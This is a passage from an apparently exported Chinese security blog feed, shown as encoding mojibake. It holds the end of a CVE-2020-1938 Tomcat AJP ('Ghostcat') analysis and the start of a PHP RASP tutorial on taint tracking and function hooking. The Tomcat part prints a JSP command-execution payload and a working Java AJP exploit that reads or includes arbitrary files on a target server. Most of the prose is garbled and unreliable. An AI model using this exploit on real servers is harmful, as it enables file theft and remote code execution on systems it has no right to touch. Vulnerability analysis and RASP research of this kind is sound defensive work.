ËøôÈáåÂÖ∂ÂÆûÂ∞±ÊòØÂÖÅËÆ∏Êàë‰ª¨ËÆæÁΩÆRequestÂØπË±°ÁöÑattributeÂ±ûÊÄß„ÄÇÂú®‰∏ãÊñá‰∏≠‰ºöÊèêÂà∞ÁöÑÂá†‰∏™Â±ûÊÄßÂèØ‰ª•Ë¢´ËÆæÁΩÆÔºö javax.servlet.include.request_uri javax.servlet.include.path_info javax.servlet.include.servlet_path Â∞ÅË£ÖÂÆårequestÂØπË±°ÂêéÔºåÁªßÁª≠Â§ÑÁêÜServletÁöÑÊò†Â∞ÑÊµÅÁ®ã ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÂΩìurlËØ∑Ê±ÇÊú™Âú®Êò†Â∞ÑÁöÑurlÂàóË°®ÈáåÈù¢Âàô‰ºöÈÄöËøátomcatÈªòËÆ§ÁöÑDefaultServlet‰ºöÊ†πÊçÆ‰∏äÈù¢ÁöÑ‰∏â‰∏™Â±ûÊÄßÊù•ËØªÂèñÊñá‰ª∂Ôºå/org/apache/catalina/servlets/DefaultServlet.classÔºöË∑üËøõgetRelativePathÂáΩÊï∞ÔºåÂΩìrequestÂ±ûÊÄß‰∏≠javax.servlet.include.request_uri‰∏ç‰∏∫Á©∫ÔºåÂàôÂèñÂá∫Âè¶Â§ñ‰∏§‰∏™javax.servlet.include.path_infoÂíåjavax.servlet.include.servlet_pathÂ±ûÊÄßÔºåÊúÄÂêéÂä†Âà∞resultÈáåËøîÂõûÔºö ÁÑ∂ÂêéÂ∞ÜÁªìÊûúÂ∏¶ÂÖ•this.resources.getResourceÂáΩÊï∞ÔºöÁÑ∂Âêé‰∏ÄÁõ¥Ë∑üËøõÔºåÁõ¥Âà∞Ë∞ÉÁî®this.cache.getResourceÂáΩÊï∞ËØªÂèñËµÑÊ∫êÔºö ËØªÂèñÂà∞/WEB-INF/web.xmlÊñá‰ª∂Ôºö ‰ªªÊÑèÊñá‰ª∂ÂåÖÂê´ÂΩìurlËØ∑Ê±ÇÊò†Â∞ÑÂú®org.apache.jasper.servlet.JspServletËøô‰∏™servletÁöÑÊó∂ÂÄô‰πüÂèØÈÄöËøá‰∏äËø∞‰∏â‰∏™Â±ûÊÄßÊù•ÊéßÂà∂ËÆøÈóÆÁöÑjspÊñá‰ª∂„ÄÇ Èöè‰æøÂåÖÂê´‰∏Ä‰∏™‰∏ä‰º†ÁöÑÊñá‰ª∂:upload12345&lt;%@ page language="java" import="java.lang.*" contentType="text/html; charset=ISO-8859-1" pageEncoding="ISO-8859-1"%&gt; &lt;% Runtime.getRuntime().exec("open -a Calculator"); %&gt; EXPajpÂçèËÆÆÁöÑÈÄö‰ø°ÂÆ¢Êà∑Á´Ødemo: https://github.com/kohsuke/ajp-client ËøôÈáåË¥¥‰∏Ä‰∏™threedr3amÂ∏àÂÇÖÁöÑEXP: https://github.com/threedr3am/learnjavabug1234567891011121314151617181920212223242526272829303132public class FileRead &#123; public static void main(String[] args) throws IOException &#123; SimpleAjpClient ac = new SimpleAjpClient(); String host = "localhost"; int port = 8009; String uri = "/xxxxxxxxxxxxxxxest.xxx"; String file = "/index.jsp"; if (args.length == 4) &#123; host = args[0]; port = Integer.parseInt(args[1]); uri = args[2].equalsIgnoreCase("file") ? uri : "/xxxxxxxxxxxxxxxest.jsp"; file = args[3]; &#125; ac.connect(host, port); // create a message that indicates the beginning of the request TesterAjpMessage forwardMessage = ac.createForwardMessage(uri); forwardMessage.addAttribute("javax.servlet.include.request_uri", "1"); forwardMessage.addAttribute("javax.servlet.include.path_info", file); forwardMessage.addAttribute("javax.servlet.include.servlet_path", ""); forwardMessage.end(); ac.sendMessage(forwardMessage); while (true) &#123; byte[] responseBody = ac.readMessage(); if (responseBody == null || responseBody.length == 0) break; System.out.print(new String(responseBody)); &#125; ac.disconnect(); &#125;&#125; ÊØîËæÉÁÆÄÂçïÔºåÊ≤°Âï•Â•ΩËØ¥ÁöÑÔºåÊåáÂÆöË∑ØÁî±‰∏∫jspÁöÑÊó∂ÂÄôËµ∞org.apache.jasper.servlet.JspServletÂ§ÑÁêÜÔºåÂÖ∂‰ªñÂàôËµ∞/org/apache/catalina/servlets/DefaultServletÈªòËÆ§Â§ÑÁêÜ„ÄÇ ÊúÄÂêéÊ¥ûÊå∫ÁâõÈÄºÁöÑÔºåËôΩÁÑ∂‰∏çËÉΩÁõ¥Êé•ÂëΩ‰ª§ÊâßË°åÔºåÊú¨Âú∞ÁöÑmxsrvsÂêØÂä®tomcatÁöÑÊó∂ÂÄôÈªòËÆ§ÂêØÂä®8009Ôºå‰ΩÜÊòØÂÆûÊµã‰∫Ü‰∏Ä‰∫õÁúüÂÆûÁéØÂ¢ÉÁöÑÔºåÁã¨Á´ãÈÉ®ÁΩ≤ÁöÑÊó∂ÂÄôÂ§ßÈÉΩÊ≤°ÊúâajpËøô‰∏™Á´ØÂè£ÔºåÊàñËÆ∏Âú®Ë¥üËΩΩÂùáË°°Âèç‰ª£ÁöÑÂú∫ÊôØÊØîËæÉÂ§öÔºü ÂèÇËÄÉÊñáÁ´† CVE-2020-1938 : Tomcat-Ajp ÂçèËÆÆÊºèÊ¥ûÂàÜÊûê The Apache Tomcat Connectors - AJP Protocol Reference Â¶Ç‰ΩïÊñ≠ÁÇπË∞ÉËØïTomcatÊ∫êÁ†Å]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>ÊºèÊ¥ûÂàÜÊûê</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[‰ªé0ÂºÄÂßãÁöÑPHP RASPÁöÑÂ≠¶‰π†]]></title>
    <url>%2F2020%2F03%2F01%2F%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84PHP%20RASP%E7%9A%84%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[Âü∫Á°ÄRASP ËÆæËÆ°ÊÄùË∑ØRASPÔºàRuntime Application self-protectionÔºâÊòØ‰∏ÄÁßçÂú®ËøêË°åÊó∂Ê£ÄÊµãÊîªÂáªÂπ∂‰∏îËøõË°åËá™Êàë‰øùÊä§ÁöÑ‰∏ÄÁßçÊäÄÊúØ„ÄÇPHP RASPÁöÑËÆæËÆ°ÊÄùË∑ØÂæàÁõ¥Êé•ÔºåÂÆâÂÖ®ÂúàÊúâ‰∏ÄÂè•ÂêçË®ÄÂè´‰∏ÄÂàáËæìÂÖ•ÈÉΩÊòØÊúâÂÆ≥ÁöÑÔºåÊàë‰ª¨Â∞±Ë∑üË∏™Ëøô‰∫õÊúâÂÆ≥ÂèòÈáèÔºåÁúãÂÆÉ‰ª¨ÊòØÂê¶ÂØπÁ≥ªÁªüÈÄ†Êàê‰∫ÜÂç±ÂÆ≥„ÄÇÊàë‰ª¨Ë∑üË∏™‰∫ÜHTTPËØ∑Ê±Ç‰∏≠ÁöÑÊâÄÊúâÂèÇÊï∞„ÄÅHTTP HeaderÁ≠â‰∏ÄÂàáclientÁ´ØÂèØÊéßÁöÑÂèòÈáèÔºåÈöèÁùÄËøô‰∫õÂèòÈáèË¢´‰ΩøÁî®„ÄÅË¢´Â§çÂà∂Ôºå‰ø°ÊÅØÈöè‰πãÊµÅÂä®ÔºåÊàë‰ª¨‰πüË∑üË∏™‰∫ÜËøô‰∫õ‰ø°ÊÅØÁöÑÊµÅÂä®„ÄÇÊàë‰ª¨ËøòÈÄâÂèñ‰∫Ü‰∏Ä‰∫õÊïèÊÑüÂáΩÊï∞ÔºåËøô‰∫õÂáΩÊï∞ÈÉΩÊòØÂºïÂèëÊºèÊ¥ûÁöÑÂáΩÊï∞Ôºå‰æãÂ¶ÇrequireÂáΩÊï∞ËÉΩÂºïÂèëÊñá‰ª∂ÂåÖÂê´ÊºèÊ¥ûÔºåmysqli-&gt;queryÊñπÊ≥ïËÉΩÂºïÂèëSQLÊ≥®ÂÖ•ÊºèÊ¥û„ÄÇÁÆÄÂçïÊù•ËØ¥ÔºåËøô‰∫õÂáΩÊï∞ÈÉΩÊòØÂ§ßÂÆ∂Âú®‰ª£Á†ÅÂÆ°ËÆ°Êó∂ÂÖ≥Ê≥®ÁöÑÂáΩÊï∞„ÄÇÊàë‰ª¨Âà©Áî®Êüê‰∫õÊñπÊ≥ï‰∏∫Ëøô‰∫õÂáΩÊï∞Ê∑ªÂä†ÂÆâÂÖ®Ê£ÄÊü•‰ª£Á†Å„ÄÇÂΩìË∑üË∏™ÁöÑ‰ø°ÊÅØÊµÅÊµÅÂÖ•ÊïèÊÑüÂáΩÊï∞Êó∂ÔºåËß¶ÂèëÂÆâÂÖ®Ê£ÄÊü•‰ª£Á†ÅÔºåÂ¶ÇÊûúÈÄöËøáÂÆâÂÖ®Ê£ÄÊü•ÔºåÂºÄÂßãÊâßË°åÊïèÊÑüÂáΩÊï∞ÔºåÂ¶ÇÊûúÊ≤°ÈÄöËøáÂÆâÂÖ®Ê£ÄÊü•ÔºåÈòªÊñ≠ÊâßË°åÔºåÈÄöËøáSAPIÂêëHTTP ServerÂèëÈÄÅ403 Forbidden‰ø°ÊÅØ„ÄÇÂΩìÁÑ∂ÔºåËøô‰∏ÄÂàáÈÉΩÂú®PHP‰ª£Á†ÅËøêË°åËøáÁ®ã‰∏≠ÂÆåÊàê„ÄÇ ËøôÈáå‰∏ªË¶ÅÊúâ‰∏§‰∏™ÊäÄÊúØÈóÆÈ¢òÔºå‰∏Ä‰∏™ÊòØÂ¶Ç‰ΩïË∑üË∏™‰ø°ÊÅØÊµÅÔºåÂè¶‰∏Ä‰∏™ÊòØÂ¶Ç‰ΩïÂÆâÂÖ®Ê£ÄÊü•Âà∞Â∫ïÊòØÊÄéÊ†∑ÂÆûÁé∞ÁöÑ„ÄÇÊúâ‰∏§‰∏™ÊäÄÊúØÊÄùË∑ØÊù•Ëß£ÂÜ≥‰∏§‰∏™ÈóÆÈ¢òÔºåÁ¨¨‰∏Ä‰∏™ÊòØÂä®ÊÄÅÊ±°ÁÇπË∑üË∏™ÔºåÂè¶‰∏Ä‰∏™ÊòØÂü∫‰∫éËØçÊ≥ïÂàÜÊûêÁöÑÊºèÊ¥ûÊ£ÄÊµã„ÄÇÊú¨ÊñáÁî®‰∏ªË¶ÅÂàÜÊûêÁöÑÊòØÊ±°ÁÇπÊ†áËÆ∞ÁöÑÊñπÊ≥ï„ÄÇ ÊäÄÊúØÊ†à taintÊ±°ÁÇπÂàÜÊûêÊ®°Âºè ÂëΩ‰ª§ÊâßË°å XSS SQL payloadÊ®°ÂºèÔºöÈáçÂëΩÂêç+phpwaf ÁâπÂæÅÊçïËé∑Ê£ÄÊµã ÁÆÄËÄåË®Ä‰πãtaintÊ£ÄÊµãÊú™Áü•Ôºåpayload‰∏äÁ∫øÂâçFuzzÊ£ÄÊµãtaintÔºöÊ±°ÁÇπÊ†áËÆ∞ÔºåÂØπÂèÇÊï∞‰º†ÈÄíËøáÁ®ãËøõË°åÂà§Êñ≠Ê∏ÖÈô§Êàñ‰øùÁïôÊ†áËÆ∞payloadÊ®°ÂºèÔºöÂøΩÁï•ÂèÇÊï∞‰º†ÈÄíËøáÁ®ãÔºåÂè™ÂàÜÊûêÊúÄÂêé‰ΩúÁî®‰∫éÊïèÊÑüÂáΩÊï∞ÁöÑÂèÇÊï∞ÊòØÂê¶ÊÅ∂ÊÑè PHPÁîüÂëΩÂë®ÊúüÁÆÄËÄåË®Ä‰πãÔºåÊó†ËÆ∫‰ª•Âì™ÁßçÊñπÂºèÂêØÂä®phpÁ®ãÂ∫èÔºåÁªèËøá‰∏ãËæπÂõõ‰∏™Ê≠•È™§ÔºöÊ®°ÂùóÂàùÂßãÂåñÔºàMINITÔºâ„ÄÅËØ∑Ê±ÇÂàùÂßãÂåñ(RINIT)„ÄÅËØ∑Ê±ÇÂ§ÑÁêÜ„ÄÅËØ∑Ê±ÇÁªìÊùü(RSHUTDOWN)„ÄÅÊ®°ÂùóÁªìÊùü(MSHUTDOWN)ËøôÂõõ‰∏™Èò∂ÊÆµÂØπÂ∫îÊâ©Â±ïÂºÄÂèë‰∏≠PHP_MINIT_FUNCTION„ÄÅPHP_MSHUTDOWN_FUNCTION„ÄÅPHP_RINIT_FUNCTION„ÄÅPHP_RSHUTDOWN_FUNCTIONÂõõ‰∏™ÂáΩÊï∞Êù•Â§ÑÁêÜÂØπÂ∫îÁöÑÂäüËÉΩ„ÄÇ php opcodeopcodeÊòØËÆ°ÁÆóÊú∫Êåá‰ª§‰∏≠ÁöÑ‰∏ÄÈÉ®ÂàÜÔºåÁî®‰∫éÊåáÂÆöË¶ÅÊâßË°åÁöÑÊìç‰ΩúÔºåÊåá‰ª§ÁöÑÊ†ºÂºèÂíåËßÑËåÉÁî±Â§ÑÁêÜÂô®ÁöÑÊåá‰ª§ËßÑËåÉÊåáÂÆö„ÄÇ ËÆ∞ÂΩï‰∏Ä‰∏ãphpËß£ÊûêÁöÑËøáÁ®ãÔºö ÊóßÁâàÊú¨Ôºöphp‰ª£Á†Å‚Äî&gt;ËØçÊ≥ï„ÄÅËØ≠Ê≥ïÂàÜÊûê-&gt;Áõ¥Êé•ÁîüÊàêopcodeÊåá‰ª§ php7Ôºöphp‰ª£Á†Å‚Äî&gt;ËØçÊ≥ï„ÄÅËØ≠Ê≥ïÂàÜÊûêÁîüÊàêÊäΩË±°ËØ≠Ê≥ïÊ†ëAST-&gt;opcodeÊåá‰ª§ ÁÆÄÂçïÊ¶ÇÊã¨‰∏Ä‰∏ãÔºåÊâÄÊúâphp‰ª£Á†ÅÊúÄÁªà‰ª•opcodeÊåá‰ª§ÁöÑÂΩ¢ÂºèÂú®zendËôöÊãüÊú∫‰∏≠ÊâßË°å„ÄÇ ÂáΩÊï∞ÂÆûÁé∞PHP‰∏≠ÂáΩÊï∞ÁöÑÂ≠òÂÇ®ÁªìÊûÑÔºö/Zend/zend_compile.h#404123456789101112131415161718union _zend_function &#123; zend_uchar type; /* MUST be the first element of this struct! */ struct &#123; zend_uchar type; /* never used */ zend_uchar arg_flags[3]; /* bitset of arg_info.pass_by_reference */ uint32_t fn_flags; zend_string *function_name; zend_class_entry *scope; union _zend_function *prototype; uint32_t num_args; uint32_t required_num_args; zend_arg_info *arg_info; &#125; common; zend_op_array op_array; zend_internal_function internal_function;&#125;; Ëøô‰∏™ËÅîÂêà‰ΩìÈáåËæπÂÆö‰πâ‰∫ÜÂõõ‰∏™ÁªìÊûÑ‰ΩìÔºåÂÜÖÈÉ®ÂáΩÊï∞ÈÄöËøáÊâ©Â±ïÊàñËÄÖÂÜÖÊ†∏Êèê‰æõÁöÑCÂáΩÊï∞ÔºåÊØîÂ¶Çtime„ÄÅarrayÁ≠âÔºåÁºñËØëÂêéÁî®ÁöÑinternal_functionÁªìÊûÑÔºõÁî®Êà∑Ëá™ÂÆöÂáΩÊï∞ÁºñËØëÂêé‰∏∫ÊôÆÈÄöÁöÑopcodeÊï∞ÁªÑÔºåÁî®ÁöÑop_arrayÁªìÊûÑ„ÄÇÂâ©‰∏ãÁöÑcommonÂíåtypeÂèØ‰ª•ÁúãÂÅöÊòØinternal_functionÂíåop_arrayÁöÑheader„ÄÇ ÂÆûÈôÖ‰∏äËøòÊúâÂÖ∂‰ªñÂá†Á±ªÂáΩÊï∞ÔºåÊöÇÊó∂ËøòÊ≤°Â§™ÊòéÁôΩÔºö ÂÜÖÈÉ®ÂáΩÊï∞ÂÜÖÈÉ®ÂáΩÊï∞ÊòØÊåáÁî±ÂÜÖÊ†∏„ÄÅÊâ©Â±ïÊèê‰æõÁöÑCËØ≠Ë®ÄÁºñÂÜôÁöÑfunctionÔºåËøôÁ±ªÂáΩÊï∞‰∏çÁî®ÁªèËøáopcodeÁöÑÁºñËØëËøáÁ®ãÔºåÊïàÁéáÈ´ò‰∫éphpÁî®Êà∑Ëá™ÂÆö‰πâÂáΩÊï∞ÔºåË∞ÉÁî®Êó∂‰∏éÊôÆÈÄöÁöÑCÁ®ãÂ∫èÊ≤°ÊúâÂ∑ÆÂºÇ„ÄÇ ZendÂºïÊìé‰∏≠ÂÆö‰πâ‰∫ÜÂæàÂ§öÂÜÖÈÉ®ÂáΩÊï∞‰æõÁî®Êà∑Âú®PHP‰∏≠‰ΩøÁî®ÔºåÊØîÂ¶ÇÔºödefine„ÄÅdefined„ÄÅstrlen„ÄÅmethod_exists„ÄÅclass_exists„ÄÅfunction_existÁ≠âÁ≠âÔºåÈô§‰∫ÜZendÂºïÊìé‰∏≠ÂÆö‰πâÁöÑÂÜÖÈÉ®ÂáΩÊï∞ÔºåPHPÊâ©Â±ï‰∏≠‰πüÊèê‰æõ‰∫ÜÂ§ßÈáèÂÜÖÈÉ®ÂáΩÊï∞ÔºåÊàë‰ª¨‰πüÂèØ‰ª•ÁÅµÊ¥ªÁöÑÈÄöËøáÊâ©Â±ïËá™Ë°åÂÆöÂà∂„ÄÇ ÂâçÊñá‰ªãÁªçzend_function‰∏∫unionÔºåÂÖ∂‰∏≠internal_functionÂ∞±ÊòØÂÜÖÈÉ®ÂáΩÊï∞Áî®Âà∞ÁöÑÂÖ∑‰ΩìÁªìÊûÑÔºö/Zend/zend_compile.h#3841234567891011121314151617typedef struct _zend_internal_function &#123; /* Common elements */ zend_uchar type; zend_uchar arg_flags[3]; /* bitset of arg_info.pass_by_reference */ uint32_t fn_flags; zend_string* function_name; zend_class_entry *scope; zend_function *prototype; uint32_t num_args; uint32_t required_num_args; zend_internal_arg_info *arg_info; /* END of common elements */ void (*handler)(INTERNAL_FUNCTION_PARAMETERS); struct _zend_module_entry *module; void *reserved[ZEND_MAX_RESERVED_RESOURCES];&#125; zend_internal_function; zend_internal_functionÂ§¥ÈÉ®ÊòØ‰∏Ä‰∏™‰∏ézend_op_arrayÂÆåÂÖ®Áõ∏ÂêåÁöÑcommonÁªìÊûÑ„ÄÇ ÁéØÂ¢ÉÊê≠Âª∫ÂºÄÂèëÊµÅÁ®ãphpÁâàÊú¨7.0.33Ôºå‰∏∫‰∫ÜÊñπ‰æøÂºÄÂèëÊâ©Â±ïÔºåÂÖà‰∏ãËΩΩÊ∫êÁ†ÅÔºö1wget https://github.com/php/php-src/archive/php-7.0.33.zip Ëß£ÂéãÂêéÔºåÂú®phpÊ∫êÁ†ÅÈáåÊúâ‰∏Ä‰∏™‰ª£Á†ÅÁîüÊàêÂô®ext_skelÔºå‰Ωç‰∫éphp-src-php-7.0.33/extÔºåÂÖàÊûÑÂª∫Êâ©Â±ïÂü∫Êú¨Êñá‰ª∂Ôºö1./ext_skel --extname=passer6y Â∞Üconfig.m4Êñá‰ª∂‰∏≠ËøôÂá†Ë°åÂâçÁöÑdnlÂéªÊéâÔºö Âú®Â§¥Êñá‰ª∂php_passer6y.hÊñá‰ª∂‰∏≠Â£∞ÊòéÊâ©Â±ïÂáΩÊï∞Ôºö1PHP_FUNCTION(passer6y_helloworld); Êé•ÁùÄÁºñËæëpasser6y.cÔºåÊ∑ªÂä†‰∏ÄË°åÔºöPHP_FE(passer6y_helloworld, NULL) ÊúÄÂêéÂú®Êñá‰ª∂Êú´Â∞æÂä†ÂÖ•passer6y_helloworldÂáΩÊï∞‰ª£Á†Å1234567891011PHP_FUNCTION(passer6y_helloworld)&#123; char *arg = NULL; int arg_len, len; char *strg; if (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, "s", &amp;arg, &amp;arg_len) == FAILURE) &#123; return; &#125; php_printf("my first ext,Hello World!\n"); RETRUN_TRUE;&#125; ÁºñËØëÊâ©Â±ïÔºö1234apt-get install php7.0-devphpize./configure --with-php-config=/usr/bin/php-config7.0make &amp;&amp; make install ÊµãËØïÊèí‰ª∂Ôºö1php -d &quot;extension=passer6y.so&quot; -r &quot;passer6y_helloworld(&apos;123&apos;);&quot; GDBË∞ÉËØïÂèÇËÄÉÊñáÁ´†Ôºöhttps://www.cnblogs.com/iamstudy/articles/php_code_rasp_1.html‰∏ãËΩΩphp7.0.23Ôºöhttps://mirrors.sohu.com/php/php-7.0.23.tar.gzÈáçÊñ∞ÁºñËØëphpÔºåÂºÄÂêØ--enable-debug123456789101112131415161718./configure \--prefix=/opt/php_debug/ \--enable-debug \--enable-cli \--without-pear \--enable-embed \--enable-inline-optimization \--enable-shared \--enable-opcache \--enable-fpm \--with-gettext \--enable-mbstring \--with-iconv=/usr/local/libiconv \make &amp;&amp; make installmkdir /opt/php_debug/conf/ cp php.ini-development /opt/php_debug/conf/php.ini ÂÜçÂä†‰∏™ËΩØËøûÊé•Êñπ‰æøÊâßË°åÔºö12ln -s /opt/php_debug/bin/php /usr/bin/php_debugln -s /opt/php_debug/bin/phpize /usr/bin/phpize_debug ÂàõÂª∫Êèí‰ª∂ÁöÑÊ≠•È™§Âíå‰πãÂâç‰∏ÄÊ†∑ÔºåÂú®config.m4ÊúÄÂêéÂä†‰∏äÔºö123456if test -z "$PHP_DEBUG"; then AC_ARG_ENABLE(debug, [--enable-debug compile with debugging system], [PHP_DEBUG=$enableval], [PHP_DEBUG=no] )fi ÁÑ∂ÂêéÂÜçÁºñËØëÂç≥ÂèØÁî®gdbË∞ÉËØï‰∫Ü Âú®makeÁöÑÊó∂ÂÄôÂèØËÉΩ‰ºöÈÅáÂà∞libiconvÁöÑÊä•ÈîôÈóÆÈ¢òÔºåÂèÇËÄÉËøô‰∏™ÊñáÁ´†ÂÆâË£Ö‰∏Ä‰∏ãÂ∞±OK‰∫ÜÔºåhttps://www.cnblogs.com/rwxwsblog/p/5451467.html vldÊü•Áúã‰ª£Á†ÅopcodeÂèÇËÄÉÊñáÁ´†Ôºöhttps://www.cnblogs.com/miao-zp/p/6374311.htmlÂÆâË£ÖvldÔºö123wget https://pecl.php.net/get/vld-0.14.0.tgztar zxvf vld-0.14.0.tgz cd vld-0.14.0/ ÊâæÂà∞php-configË∑ØÂæÑ: locate php-configÁºñËØëÔºö12./configure --with-php-config=/usr/bin/php-config7.0 --enable-vldmake &amp;&amp; make install Ê£ÄÊü•ÊòØÂê¶ÁºñËØëÊàêÂäüÔºö‰øÆÊîπphp.ini /etc/php/7.0/cli/php.iniÔºåÂú®ÊúÄÂêéÂä†‰∏äÔºö1extension=vld.so Ê£ÄÊµãÊòØÂê¶ÂÆâË£ÖÊàêÂäüÔºöphp -r &quot;phpinfo();&quot; | grep &quot;vld&quot; ÂäüËÉΩÊµãËØïÔºöÂÜô‰∏Ä‰∏™phpinfoÔºåÁÑ∂ÂêéÊâßË°å‰∏ãËæπÂëΩ‰ª§Ôºå-dvld.activeÂèÇÊï∞‰∏∫1Êó∂‰ΩøÁî®vldÊâ©Â±ïÔºå-dvld.execute‰∏∫1Êó∂ÊâßË°åÊîπÊñá‰ª∂ÔºåËøôÈáå‰∏çÈúÄË¶ÅÊâßË°åÊñá‰ª∂ÔºåÂ∞±Áúã‰∏Ä‰∏ãphp‰ª£Á†ÅËΩ¨Êç¢ÂØπÂ∫îÁöÑopcodeÊåá‰ª§Ôºö1php -dvld.active=1 -dvld.execute=0 1.php apacheÈÖçÁΩÆËøòÊòØ‰πãÂâçÁöÑÊ∫êÁ†ÅÔºåÈáçÊñ∞ÁºñËØëphp1./buildconf --force &amp;&amp; ./configure --disable-all --enable-debug --prefix=/opt/php --with-apxs2=/usr/bin/apxs &amp;&amp; make &amp;&amp; make install ÁàÜ‰∫Ü‰∏Ä‰∏™Á∫øÁ®ãÂÆâÂÖ®ÁöÑÈóÆÈ¢òÔºåÊâßË°å‰∏ãÈù¢‰∏§‰∏™ÂëΩ‰ª§ÂáëÂêàÁî®ÁùÄ(ÊØè‰∏™Â≠êËøõÁ®ãÂè™Êúâ‰∏Ä‰∏™Á∫øÁ®ã)Ôºö123// apache2 -t Êü•ÁúãÈîôËØØÊó•Âøóa2dismod mpm_eventa2enmod mpm_prefork ‰πüÂèØ‰ª•Áî®Â∫∑Â∏àÂÇÖÂÜôÁöÑdockerfileÔºå‰∏ÄÈîÆÊãâÂèñÁéØÂ¢ÉÔºöDockerfile ÂëΩ‰ª§Â§áÂøòÔºö1php --ini // Êü•Áúãphp.iniÈªòËÆ§ÈÖçÁΩÆË∑ØÂæÑ ÂáΩÊï∞Hook‰∏§ÁßçÊñπÂºèÔºö ÈáçÂëΩÂêçÂáΩÊï∞ÔºåÂπ∂Âú®function_tableÂà†Èô§ÂéüÂáΩÊï∞ÂÆö‰πâÔºåÊé•ÁùÄÂú®php‰∏≠ÈáçÊñ∞ÂÆö‰πâ‰∏Ä‰∏™ËØ•ÂáΩÊï∞(ÂÉèwaf‰∏ÄÊ†∑Âú®ÂÖ•Âè£include)ÔºåÂπ∂ÂØπÂèÇÊï∞ËøõË°åÂ®ÅËÉÅÂà§Êñ≠(prvdÁöÑpayloadÊ®°Âºè) Áõ¥Êé•Âú®Â∫ïÂ±ÇHook opcodeÔºåÂπ∂Ê£ÄÊµãÂáΩÊï∞ÂáΩÊï∞(taintÊ®°Âºè) ÈáçÂëΩÂêçÂáΩÊï∞ËøôÈáåÁöÑÈáçÂëΩÂêçÂÜÖÈÉ®ÂáΩÊï∞ÊòØÂú®MINITÈò∂ÊÆµËøõË°åÂÆûÁé∞ÁöÑÔºåÂú®RINITÈò∂ÊÆµÊòØÊó†Ê≥ïÂØπÂ∑≤ÊúâÁöÑÂÜÖÈÉ®ÂáΩÊï∞ËøõË°å‰øÆÊîπÂêçÁß∞ÔºåÂè™ËÉΩÂØπÁî®Êà∑ÂáΩÊï∞‰øÆÊîπ(Âç≥php‰∏≠Ëá™ÂÆö‰πâÁöÑÂáΩÊï∞)„ÄÇ ÂèÇËÄÉfate0Â∏àÂÇÖÁöÑxmarkÈ°πÁõÆÂÆûÁé∞ÁöÑPHP_FUNCTION(xrename_function)ÂáΩÊï∞ÔºåÊ†∏ÂøÉÂú®ËøôÊÆµÔºö12// ...Bucket *p = rename_hash_key(EG(function_table), orig_fname, new_fname, XMARK_IS_FUNCTION); Ë∑üËøõrename_hash_keyÂáΩÊï∞Ôºö12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879static zend_always_inline Bucket *rename_hash_key(HashTable *ht, zend_string *orig_name, zend_string *new_name, int type)&#123; zend_ulong h; uint32_t nIndex; uint32_t idx; Bucket *p = NULL, *arData, *prev = NULL; zend_bool found = 0; orig_name = zend_string_tolower(orig_name); new_name = zend_string_tolower(new_name); if (zend_hash_exists(ht, new_name)) &#123; zend_string_release(orig_name); zend_string_release(new_name); zend_error(E_ERROR, "function/class '%s' already exists", ZSTR_VAL(new_name)); return NULL; &#125; h = zend_string_hash_val(orig_name); arData = ht-&gt;arData; nIndex = h | ht-&gt;nTableMask; idx = HT_HASH_EX(arData, nIndex); while (EXPECTED(idx != HT_INVALID_IDX)) &#123; prev = p; p = HT_HASH_TO_BUCKET_EX(arData, idx); if (EXPECTED(p-&gt;key == orig_name)) &#123; /* check for the same interned string */ found = 1; break; &#125; else if (EXPECTED(p-&gt;h == h) &amp;&amp; EXPECTED(p-&gt;key) &amp;&amp; EXPECTED(ZSTR_LEN(p-&gt;key) == ZSTR_LEN(orig_name)) &amp;&amp; EXPECTED(memcmp(ZSTR_VAL(p-&gt;key), ZSTR_VAL(orig_name), ZSTR_LEN(orig_name)) == 0)) &#123; found = 1; break; &#125; idx = Z_NEXT(p-&gt;val); &#125; if (!found) &#123; zend_string_release(orig_name); zend_string_release(new_name); zend_error(E_ERROR, "function/class '%s' does not exists", ZSTR_VAL(orig_name)); return NULL; &#125; // rehash if (!prev &amp;&amp; Z_NEXT(p-&gt;val) == HT_INVALID_IDX) &#123; // only p HT_HASH(ht, nIndex) = HT_INVALID_IDX; &#125; else if (prev &amp;&amp; Z_NEXT(p-&gt;val) != HT_INVALID_IDX) &#123; // p in middle Z_NEXT(prev-&gt;val) = Z_NEXT(p-&gt;val); &#125; else if (prev &amp;&amp; Z_NEXT(p-&gt;val) == HT_INVALID_IDX) &#123; // p in tail Z_NEXT(prev-&gt;val) = HT_INVALID_IDX; &#125; else if (!prev &amp;&amp; Z_NEXT(p-&gt;val) != HT_INVALID_IDX) &#123; // p in head HT_HASH(ht, nIndex) = Z_NEXT(p-&gt;val); &#125; zend_string_release(p-&gt;key); p-&gt;key = zend_string_init_interned(ZSTR_VAL(new_name), ZSTR_LEN(new_name), 1); p-&gt;h = h = zend_string_hash_val(p-&gt;key); nIndex = h | ht-&gt;nTableMask; // ÈáçÂëΩÂêçÂáΩÊï∞Âêç if (type == XMARK_IS_FUNCTION) &#123; zend_string_release(p-&gt;val.value.func-&gt;common.function_name); zend_string_addref(p-&gt;key); p-&gt;val.value.func-&gt;common.function_name = p-&gt;key; &#125; if (HT_HASH(ht, nIndex) != HT_INVALID_IDX) Z_NEXT(p-&gt;val) = HT_HASH(ht, nIndex); HT_HASH(ht, nIndex) = idx; zend_string_release(orig_name); zend_string_release(new_name); return p;&#125; Hook opcode‰∏∫‰ªÄ‰πàË¶Åhook opcodeÂë¢ÔºüÂú®ÂêéÊù•ÁöÑÊµãËØï‰∏≠ÂèëÁé∞ÂÉèecho„ÄÅevalËøô‰∫õÔºåÂÆÉÊòØ‰∏Ä‰∏™ËØ≠Ë®ÄÁâπÊÄßÔºåËÄå‰∏çÊòØ‰∏Ä‰∏™ÂáΩÊï∞ÔºåÂú®EG(function_table)Ëøô‰∏™ËÆ∞ÂΩïÊâÄÊúâPHPÂáΩÊï∞ÁöÑÂìàÂ∏åË°®‰∏≠Êâæ‰∏çÂà∞Ôºå‰ΩÜÊòØ‰ªñ‰ª¨ÊúÄÁªàÈÉΩË¶ÅËß£ÊûêÊàêopcodeÔºåÊâÄ‰ª•ÂèØ‰ª•ÈÄöËøáËøôÁßçÊñπÂºèÊù•Âä´ÊåÅÂáΩÊï∞„ÄÇ 